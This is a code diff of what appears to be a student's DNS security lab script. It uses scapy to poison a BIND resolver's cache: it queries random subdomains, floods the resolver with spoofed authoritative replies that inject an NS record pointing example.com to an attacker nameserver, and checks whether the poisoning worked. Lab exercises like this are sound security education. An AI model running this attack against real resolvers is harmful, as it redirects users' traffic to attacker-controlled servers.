@@ -24,6 +24,7 @@ dns_port = args.dns_port
 # port that your bind uses to send its DNS queries
 my_query_port = args.query_port
 
+
 '''
 Generates random strings of length 10.
 '''
@@ -48,7 +49,8 @@ Sends a DNS query using scapy.
 def SendDNSQuery():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     dnsPacket = DNS(rd=1, qd=DNSQR(qname='example.com'))
-    sendPacket(sock, dnsPacket, my_ip, my_port)
+    # sendPacket not working, so I send manually:
+    sock.sendto(bytes(dnsPacket), (my_ip, my_port))
     response = sock.recv(4096)
     spoof_response = DNS(response)
 
@@ -57,22 +59,40 @@ def SendDNSQuery():
 
         # Query the BIND server for a non-existing name
         spoof_query = DNS(rd=1, qd=DNSQR(qname=spoof_random_domain))
-        sendPacket(sock, spoof_query, my_ip, my_port)
+        # sendPacket not working, so I send manually:
+        sock.sendto(bytes(spoof_query), (my_ip, my_port))
 
-        # Flood it with a stream of spoofed DNS replies
-        for i in 100:
+        # # Flood it with a stream of spoofed DNS replies
+        for i in range(100):
             # DNS fields:
             # https://scapy.readthedocs.io/en/latest/api/scapy.layers.dns.html
-            spoof_response = DNS(id=getRandomTXID(), qr=1, aa=1, qd=spoof_query.qd,
-                                an=DNSRR(rrname=spoof_query.qd.qname, ttl=99999, rdata='1.2.3.4'),
-                                ns=DNSRR(rrname='example.com', ttl=99999, rdata='ns.dbslabattacker.net'))
-            sendPacket(sock, spoof_response, my_ip, my_query_port)
+            spoof_response = DNS(   id=getRandomTXID(), 
+                                    qr=1,
+                                    aa=1, 
+                                    qd=spoof_query.qd,
+                                    nscount = 1,
+                                    an=DNSRR(rrname=spoof_random_domain, ttl=99999, rdata='1.2.3.4', type='A'),
+                                    ns=DNSRR(rrname='example.com', ttl=99999, rdata='ns.dbslabattacker.net', type='NS'))
+            sock.sendto(bytes(spoof_response), (my_ip, my_query_port))
+        
+        # check if spoofed
+        dnsPacket.qd.name = 'example.com'
+        # sendPacket not working, so I send manually:
+        sock.sendto(bytes(dnsPacket), (my_ip, my_port))
+        response = sock.recv(4096)
+        response = DNS(response)
 
-    response = sock.recv(4096)
-    response = DNS(response)
-    print "\n***** Packet Received from Remote Server *****"
-    print response.show()
-    print "***** End of Remote Server Packet *****\n"
+        print "\n***** Packet Received from DNS BIND Server *****"
+        print response.show()
+        print "***** End of Remote DNS BIND Packet *****\n"
+
+        if response and response[DNS].ns[DNSRR].rdata == 'ns.dbslabattacker.net.':
+            print('Success!\n')
+            break
+        else:
+            print('NS name:\n%s\n' % response[DNS].ns[DNSRR].rdata)
+        
+        print("---Next Round Attempt...---\n")
     
 
 if __name__ == '__main__':
